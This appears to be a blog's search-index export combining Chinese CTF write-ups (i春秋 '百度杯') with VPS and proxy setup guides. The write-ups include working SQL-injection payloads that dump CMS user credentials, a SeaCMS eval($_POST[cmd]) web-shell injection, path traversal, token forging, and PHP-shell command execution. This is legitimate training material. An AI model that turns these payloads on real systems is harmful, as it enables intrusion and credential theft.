  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Yeser writeup]]></title>
    <url>%2F2018%2F05%2F28%2FYeserCMS%2F</url>
    <content type="text"><![CDATA[打开来是一个不知道什么cms的页面： 上cms指纹识别： 但是貌似识别不出来，想想其他方法比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西 点进去看了看，跟题目的cms差不多差不多确定是easycms了，搜一搜easycms漏洞但是找到的大多数不能用，最终还是看了大佬们写的writeup在URL/celive/live/header.php处有一个xpath注入漏洞xpath注入科普payload：第一段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520 第二段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520这里得分成两段显示： 得到管理员的账户是admin密码是md5加密的Yeser231 登陆后台： 找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp在模版-&gt;当前模版编辑处 点击编辑，这个时候会把这个文件名传进去，然后再显示出来这个文件的内容： 这个时候直接看到提示：flag在网站根目录下的flag.php中把id换成../../flag.php即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>xpath注入</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Test writeup]]></title>
    <url>%2F2018%2F05%2F28%2Ftest%2F</url>
    <content type="text"><![CDATA[首先打开题目： 发现是一个海洋CMS，但是不太清楚版本往下翻一翻，发现有个年份 看得出是一个很老的版本了，题目的提示是：善于查资料，你就可以拿一血了好吧直接查资料：海洋cms漏洞利用 直接一大块的漏洞出来了。这里直接找到payload了：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 然后打开菜刀：密码cmd连接即可： 连接成功： 可以发现在html/data下有个common.inc.php 这个是数据库的配置文件 菜刀连接数据库拿到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos6&7 搭建ssr科学上网及IPv6免流]]></title>
    <url>%2F2018%2F05%2F27%2Fssr%2F</url>
    <content type="text"><![CDATA[1.购买vps这里给出链接，就不仔细介绍了 2.搭建ssr连接上xshell或者其他shell软件之后，复制以下命令：wget -N https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.shchmod +x ssr.shbash ssr.sh一条一条命令执行即可，执行完之后看到的是这个页面： 选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码： 加密方式选择10. aes-256-cfb 协议插件和混淆插件分别选择：2.auth_sha1_v4和tls1.2_ticket_auth 询问是否兼容原版，原版就是ss，这里选择no，选择yes的话就能支持ss客户端了： 限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：(这里自用，所以没有限速和限流) 回车之后就可以开始安装了： 出来这个页面的话，证明已经安装完成了，如果嫌麻烦的话，这样已经可以直接用了，但是如果你想多端口配置也是可以的,输入:bash ssr.sh进入ssr的管理页面, 如果之前的步骤有些小问题的话这里也是可以修改的，现在我们需要切换成多端口模式： 配置跟之前的单端口一样就行，设置成功后： 直接就有一个端口，这个端口是之前单端口设置的，进入管理页面： 多端口模式下7.用户配置可以添加新的端口： 操作跟之前一样，配置成功后： 3.客户端的安装SSR:Windows：https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z安卓：https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk windows版解压完之后直接运行： 任务栏会出现一个小飞机：首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。 安卓的比较简单，就不仔细截图了。首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”-&gt;从剪切板导入即可(同样得复制之前的ssr链接) SSWindows：https://github.com/shadowsocks/shadowsocks-windows/releases安卓：https://github.com/shadowsocks/shadowsocks-android/releases 使用方法跟ssr差不多，对照着就行。 4.bbr加速这一步主要是给自己的ssr提速复制以下命令到shell里: yum -y install wget wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh ./bbr.sh 安装完之后会提示你是否重启，选择y然后就能正常使用了。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>免流</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS的选择及购买]]></title>
    <url>%2F2018%2F05%2F27%2Fvps%2F</url>
    <content type="text"><![CDATA[这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷） 注册Vultr打开注册链接点击右上方的Create Account注册比较简单，输入邮箱密码创建就行进入邮箱确认，登陆后： 充值点击Billing,然后点击Make Payment下的Alipay 选择价格然后充值，第一次使用少充点，10美元就行觉得好用再继续充值就行，然后会跳转到支付宝的支付页面，用支付宝付款即可 添加服务器点击左侧的Servers可以看到右边有个“+”号：点击之后，这个页面是选择地区 在国内的话最好选择日本的服务器速度最快可以选择其他地区的比如纽约，洛杉矶，速度也不慢 选择系统类型，这里选择centos6，因为centos7的防火墙可能会导致ssr的一些服务不能用价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数个人用的话选择最便宜的就行了。下方勾选Enable IPv6，需要IPv6免流的可以勾上 然后直接Deploy Now即可 这里附上一种测速方法： 使用ping命令： vutrl一开始最多可以创建5个VPS 创建完之后拿ping命令去试试速度 win+r 输入cmd 在控制台输入：ping 你的服务器IP 看看延迟就行，延迟越低速度越快 如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除） 连接服务器回到Servers页面点击刚刚创建的服务器这里的IP和密码待会得用到 这里有服务器的ssh我们需要使用shell软件来连接他这里演示的是xshell：从网上直接下载xshell就可以使用： 点击文件，新建 名称随便写个就行，主机处填写你服务器的IP然后点击左边的用户身份验证 用户名写root，密码从刚刚那个页面复制下来，然后点击连接就行出现这个页面就代表连接成功了:]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>vps购买</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 “百度杯”login Writeup]]></title>
    <url>%2F2018%2F05%2F26%2Flogin%2F</url>
    <content type="text"><![CDATA[首先打开来是一个登陆的页面： 看看源码有没有什么提示： 可以看到最后面注释了两个test1 我们拿test1登陆进去试试： 登陆成功。左右看看没有什么发现。打开burpsuite抓包试试: 可以看到响应包有show这个参数，并且等于0我们将show这个参数等于1发送试试: 发送之后果然出现了一段代码： 这段代码的大概意思是： 当$login['user']='ichunqiu'的时候，echo flag 但是login只能从token中获得，并且被几个函数加密了， 我们只需要照着过程逆回去即可 payload： $arr = array('user'=>'ichunqiu'); $hello = base64_encode(gzcompress(serialize('$arr'))); echo $hello; 直接解析之后echo的值就是我们需要的token值,这里解密之后是这个： eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA== 将token放到cookie里发送即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋"百度杯" 十月份Backdoor Write up]]></title>
    <url>%2F2018%2F05%2F26%2FBackdoor%2F</url>
    <content type="text"><![CDATA[春秋”百度杯” 十月份Backdoor Write up 首先题目提示: 敏感文件泄露 .git泄露： 使用githack将网站源码下载下来： 目录下有： 但是都是没有用的信息： 访问： .git/logs/refs/heads/master 猜想是还原版本： git checkout 734d08 然后再看看： 果然是，多试几个之后就出来一个不一样的flag文件： 访问b4ckdo0r.php： 其他地方没给什么提示，就试试有没有swp/swo文件：swp文件是vim编辑器不正常退出时产生的文件 URL/.b4ckdo0r.php.swp 或者 URL/.b4ckdo0r.php.swo 然后可以知道swp文件没有，但是`swo`文件存在 下载下来之后将后缀名`swo更改为swp` 在`linux`下进行还原 这里附上还原方法： 在linux下 假设你的swp文件叫'.index.php.swp' 可用带-r参数编辑 #vi -r index.php 然后wq保存即可 或者使用: #vi .index.php.swp 然后:recover 最后wq保存 还原出来之后是: php混淆加密，给出python脚本，参考链接将其中的URL换成题目的URL就行： 执行： python 保存的脚本名字.py b4ckdo0r.php 可以看到phpshell 执行 system('ls'); 查看即可得到flag: system('cat this_i5_flag.php');]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>vim文件备份</tag>
      </tags>
  </entry>
</search>
